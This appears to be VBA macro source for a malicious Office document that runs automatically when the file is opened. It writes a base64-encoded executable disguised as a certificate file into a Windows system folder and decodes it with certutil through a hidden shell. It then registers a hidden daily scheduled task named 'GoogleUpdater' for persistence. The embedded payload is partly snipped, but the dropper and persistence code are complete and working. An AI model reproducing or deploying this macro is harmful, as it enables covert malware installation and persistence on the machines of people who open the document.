Sub Document_Open()
    DropPayload
    EstablishViaTask
End Sub

Sub AutoOpen()
    DropPayload
    EstablishViaTask
End Sub

Function XmlTime(t)
    Dim cSecond, cMinute, CHour, cDay, cMonth, cYear
    Dim tTime, tDate

    cSecond = "0" & Second(t)
    cMinute = "0" & Minute(t)
    CHour = "0" & Hour(t)
    cDay = "0" & Day(t)
    cMonth = "0" & Month(t)
    cYear = Year(t)

    tTime = Right(CHour, 2) & ":" & Right(cMinute, 2) & _
        ":" & Right(cSecond, 2)
    tDate = cYear & "-" & Right(cMonth, 2) & "-" & Right(cDay, 2)
    XmlTime = tDate & "T" & tTime
End Function


Sub EstablishViaTask()

    Const TriggerTypeTime = 1
    Const ActionTypeExec = 0

    Set service = CreateObject("Schedule.Service")
    Call service.Connect

    Dim rootFolder
    Set rootFolder = service.GetFolder("\")

    Dim taskDefinition

    Set taskDefinition = service.NewTask(0)

    Dim regInfo
    Set regInfo = taskDefinition.RegistrationInfo
    regInfo.Description = "totally not malicious"
    regInfo.Author = "burmat"

    Dim principal
    Set principal = taskDefinition.principal
    principal.LogonType = 3

    Dim settings
    Set settings = taskDefinition.settings
    settings.Enabled = True
    settings.StartWhenAvailable = True
    settings.Hidden = True

    Dim triggers
    Set triggers = taskDefinition.triggers

    Dim trigger
    Set trigger = triggers.Create(TriggerTypeTime)

    Dim startTime, endTime

    Dim time
    time = DateAdd("n", 1, Now)
    startTime = XmlTime(time)

    time = DateAdd("n", 90000, Now)
    endTime = XmlTime(time)

    trigger.StartBoundary = startTime
    trigger.EndBoundary = endTime
    trigger.ExecutionTimeLimit = "PT15000M"
    trigger.ID = "TimeTriggerId"
    trigger.Enabled = True

    Set repetitionPattern = trigger.Repetition
    repetitionPattern.Duration = "PT90000M"
    repetitionPattern.Interval = "PT24H"

    Dim Action
    Set Action = taskDefinition.Actions.Create(ActionTypeExec)

    Action.Path = "C:\Windows\System32\spool\drivers\color\GoogleUpdater.exe"
    Action.Arguments = ""
    Call rootFolder.RegisterTaskDefinition("GoogleUpdater", taskDefinition, 6, , , 3)
        
End Sub

Sub DropPayload()
    Dim oFSO As Object
    Dim oFile As Object
    Dim sDecodeCmd As String
    Dim sExecCmd As String
    
    ' write your base64 blob to a text file to decode with certutil
    Set oFSO = CreateObject("Scripting.FileSystemObject")
    Set oFile = oFSO.CreateTextFile("C:\Windows\System32\spool\drivers\color\GoogleUpdater.crt")
    oFile.WriteLine "-----BEGIN CERTIFICATE-----"
    oFile.WriteLine "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    oFile.WriteLine "AAAAAAAAAAAAAAAAAAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v"
    oFile.WriteLine "dCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAC7+hSx/5t64v+beuL/m3ri"
    oFile.WriteLine "pPN+4/WbeuKk83nj+pt64qTzf+N4m3ripPN74/ybeuL/m3vip5t64kHqf+Pam3ri"
    oFile.WriteLine "Qep+4++beuJB6nnj9pt64mjpfuP+m3riaOl44/6beuJSaWNo/5t64gAAAAAAAAAA"
    oFile.WriteLine "AAAAAAAAAAAAAAAAAAAAAFBFAABkhgYAJmu5YAAAAAAAAAAA8AAiAAsCDhwAvgAA"
    '        <-- SNIP --> 
    oFile.WriteLine "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    oFile.WriteLine "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    oFile.WriteLine "-----END CERTIFICATE-----"
    oFile.WriteLine ""

    oFile.Close
    
    Set oFSO = Nothing
    Set oFile = Nothing
    
    ' the following will likely get you caught
    sExecCmd = "cmd.exe /c certutil.exe -decode C:\Windows\System32\spool\drivers\color\GoogleUpdater.crt C:\Windows\System32\spool\drivers\color\GoogleUpdater.exe"
    Shell sExecCmd, vbHide
    
End Sub